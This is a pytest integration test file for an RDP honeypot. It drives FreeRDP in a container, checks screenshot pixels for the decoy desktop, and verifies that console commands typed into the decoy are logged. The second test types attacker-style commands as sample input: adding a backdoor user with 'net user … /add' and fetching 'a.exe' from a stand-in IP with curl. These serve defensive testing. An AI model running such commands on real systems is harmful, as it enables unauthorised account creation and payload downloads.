"""What the RDP honeypot shows a visitor, checked against FreeRDP.

The unit tests drive the session with aardwolf, which decodes only fast-path bitmap updates.
FreeRDP 3 is the client most attack tooling is built on, and it decodes the slow-path updates
this honeypot sends, so it is the one that can say whether the desktop is really on screen:
the test connects with `xfreerdp3` inside a container (Xvfb for a display), takes a screenshot,
and reads pixels from where the wallpaper, an icon and the taskbar should be.

A second test drives the console: `xdotool` double-clicks the `cmd` icon and types commands
through FreeRDP (real scancodes, real mouse events), then checks the window painted and that the
honeypot recorded every command, the download attempt as CRITICAL.

Opt-in (`RUN_DOCKER_TESTS=1`): it installs FreeRDP into an Alpine container, which needs the
network, and takes about 30 seconds.
"""

from __future__ import annotations

import asyncio
import os
import re
import subprocess

import pytest

from tests._ports import free_port

pytestmark = pytest.mark.asyncio

_SCRIPT = r"""
apk add --no-cache freerdp xvfb imagemagick >/dev/null 2>&1 || exit 90
Xvfb :99 -screen 0 1280x800x24 >/dev/null 2>&1 &
sleep 2
export DISPLAY=:99
xfreerdp3 /v:host.docker.internal:{port} /u:{user} /p:{password} /d:CORP /cert:ignore \
    /size:1024x768 /bpp:16 >/tmp/freerdp.log 2>&1 &
sleep 9
import -window root /tmp/shot.png
for point in 30,30 500,300 5,750 1000,750; do
  echo "PIXEL $point $(convert /tmp/shot.png -format '%[pixel:p{{'$point'}}]' info:)"
done
"""


def _docker_available() -> bool:
    try:
        return subprocess.run(["docker", "info"], capture_output=True, timeout=15).returncode == 0
    except Exception:
        return False


skip_docker = pytest.mark.skipif(
    os.environ.get("RUN_DOCKER_TESTS") != "1" or not _docker_available(),
    reason="needs Docker and RUN_DOCKER_TESTS=1 (installs FreeRDP in a container)",
)


@pytest.fixture
async def isolated_db(tmp_path, monkeypatch):
    """A throwaway database for the test. Without it the settings cache points at whatever
    DATABASE_URL the developer's `.env` names, and the test leaves its honeypots and alerts in
    the real development database."""
    from honeypot_mcp import config
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    previous = os.environ.get("DATABASE_URL")
    await close_db()
    os.environ["DATABASE_URL"] = f"sqlite+aiosqlite:///{tmp_path / 'it.db'}"
    config._settings = None
    event_buffer.reset_for_tests()
    await init_db()
    buffer = event_buffer.get_buffer()
    await buffer.start()
    yield
    await asyncio.sleep(0.2)
    await buffer.stop()
    event_buffer.reset_for_tests()
    await close_db()
    if previous is None:
        os.environ.pop("DATABASE_URL", None)
    else:
        os.environ["DATABASE_URL"] = previous
    config._settings = None


def _rgb(text: str) -> tuple[int, int, int]:
    match = re.search(r"srgb\((\d+),(\d+),(\d+)\)", text)
    assert match, f"unreadable pixel: {text!r}"
    return int(match[1]), int(match[2]), int(match[3])


@skip_docker
async def test_freerdp_gets_a_desktop_with_icons_and_a_taskbar(isolated_db):
    from sqlalchemy import select

    from honeypot_mcp.engines.http_admin import derive_login
    from honeypot_mcp.engines.rdp import RDPEngine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, Honeypot, HoneypotType

    port = free_port()
    async with get_session() as session:
        session.add(Honeypot(name="rdp-fr", type=HoneypotType.RDP, port=port))
        await session.flush()
    engine = RDPEngine()
    container_id = await engine.start("rdp-fr", port, {})
    try:
        user, password = derive_login("rdp-fr")
        script = _SCRIPT.format(port=port, user=user, password=password)
        result = await asyncio.to_thread(
            subprocess.run,
            ["docker", "run", "--rm", "alpine", "sh", "-c", script],
            capture_output=True,
            text=True,
            timeout=240,
        )
        assert result.returncode != 90, "could not install FreeRDP (no network?)"
        pixels = dict(re.findall(r"PIXEL (\d+,\d+) (\S+)", result.stdout))
        assert len(pixels) == 4, result.stdout + result.stderr

        # Wallpaper: a blue gradient, not the black of a window that never painted.
        wallpaper = _rgb(pixels["500,300"])
        assert wallpaper[2] > 60 and wallpaper[2] > wallpaper[0] + 30, wallpaper
        # An icon sits at (24, 24) to (72, 72): near-white.
        icon = _rgb(pixels["30,30"])
        assert min(icon) > 200, icon
        # The taskbar: dark across the bottom, a blue start button at the left.
        assert max(_rgb(pixels["1000,750"])) < 70
        start = _rgb(pixels["5,750"])
        assert start[2] > 150 and start[0] < 40, start

        await asyncio.sleep(1.0)
        async with get_session() as session:
            rows = (await session.execute(select(Alert))).scalars().all()
        kinds = {a.event_type for a in rows}
        assert "rdp_session_start" in kinds, kinds
    finally:
        await engine.stop(container_id)


_CONSOLE_SCRIPT = r"""
apk add --no-cache freerdp xvfb imagemagick xdotool >/dev/null 2>&1 || exit 90
Xvfb :99 -screen 0 1280x800x24 >/dev/null 2>&1 &
sleep 2
export DISPLAY=:99
xfreerdp3 /v:host.docker.internal:{port} /u:{user} /p:{password} /d:CORP /cert:ignore \
    /size:1024x768 /bpp:16 >/tmp/freerdp.log 2>&1 &
sleep 9
xdotool search --class xfreerdp windowfocus 2>/dev/null
xdotool mousemove 40 130; sleep 0.3
xdotool click --repeat 2 --delay 150 1; sleep 1.5
for c in "whoami" "hostname" "net user hax Passw0rd1 /add" "curl http://203.0.113.5/a.exe -o a.exe" "powershell" "Get-Process"; do
  xdotool type --delay 60 "$c"; xdotool key Return; sleep 0.8
done
import -window root /tmp/shot.png
for point in 300,155 820,160 200,300 300,500 1000,300; do
  echo "PIXEL $point $(convert /tmp/shot.png -format '%[pixel:p{{'$point'}}]' info:)"
done
"""


@skip_docker
async def test_freerdp_can_open_the_console_and_what_it_types_is_recorded(isolated_db):
    from sqlalchemy import select

    from honeypot_mcp.engines.http_admin import derive_login
    from honeypot_mcp.engines.rdp import RDPEngine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, Honeypot, HoneypotType

    port = free_port()
    async with get_session() as session:
        session.add(Honeypot(name="rdp-con", type=HoneypotType.RDP, port=port))
        await session.flush()
    engine = RDPEngine()
    container_id = await engine.start("rdp-con", port, {})
    try:
        user, password = derive_login("rdp-con")
        script = _CONSOLE_SCRIPT.format(port=port, user=user, password=password)
        result = await asyncio.to_thread(
            subprocess.run,
            ["docker", "run", "--rm", "alpine", "sh", "-c", script],
            capture_output=True,
            text=True,
            timeout=300,
        )
        assert result.returncode != 90, "could not install FreeRDP (no network?)"
        pixels = dict(re.findall(r"PIXEL (\d+,\d+) (\S+)", result.stdout))
        assert len(pixels) == 5, result.stdout + result.stderr
        assert min(_rgb(pixels["300,155"])) > 240  # the console's white title bar
        red = _rgb(pixels["820,160"])  # its close button
        assert red[0] > 200 and red[1] < 60
        # The console body is black (cmd) or dark blue (PowerShell, which the test ends in);
        # the wallpaper behind it never has a green channel that low.
        for point in ("200,300", "300,500"):
            r, g, _b = _rgb(pixels[point])
            assert r < 40 and g < 60, (point, pixels[point])
        assert _rgb(pixels["1000,300"])[2] > 60  # wallpaper beyond the window

        # Let the session end and be recorded.
        for _ in range(60):
            await asyncio.sleep(0.5)
            async with get_session() as session:
                rows = (await session.execute(select(Alert))).scalars().all()
            if any(a.event_type == "rdp_session" for a in rows):
                break
        commands = [a for a in rows if a.event_type == "rdp_command"]
        typed = [(a.payload["shell"], a.payload["command"]) for a in commands]
        assert typed == [
            ("cmd", "whoami"), ("cmd", "hostname"), ("cmd", "net user hax Passw0rd1 /add"),
            ("cmd", "curl http://203.0.113.5/a.exe -o a.exe"), ("cmd", "powershell"),
            ("powershell", "Get-Process"),
        ]  # fmt: skip
        download = next(a for a in commands if "curl" in a.payload["command"])
        assert download.severity.value == "critical" and download.payload["urls"] == [
            "http://203.0.113.5/a.exe"
        ]
    finally:
        await engine.stop(container_id)
